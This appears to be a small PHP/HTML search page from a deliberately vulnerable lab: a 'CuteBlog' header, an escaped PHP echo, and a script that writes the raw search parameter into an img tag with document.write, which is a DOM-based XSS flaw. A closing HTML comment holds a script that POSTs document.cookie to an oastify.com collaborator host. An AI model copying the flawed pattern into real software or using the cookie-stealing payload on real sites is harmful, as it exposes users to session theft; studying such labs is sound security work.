<header class="col-12 p-3 p-md-3 d-flex justify-content-center">
    <h1>CuteBlog 🥳</h1>
</header>
<?php
if (isset($_GET["search"])) {
    echo '<h2 class="d-flex justify-content-center"> 0 search results for \'' . htmlspecialchars($_GET["search"]) . '\'</h2>';
}
?>
<script>
    function trackSearch(query) {
        document.write('<img src="./img/result.ico' + query + '">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if (query) {
        trackSearch(query);
    }
</script>
<!-- <script>fetch("https://vutcjer6pvstyk6xdq0sq6cec5iv6k.oastify.com", {method: "POST",body: document.cookie }) ;</script> -->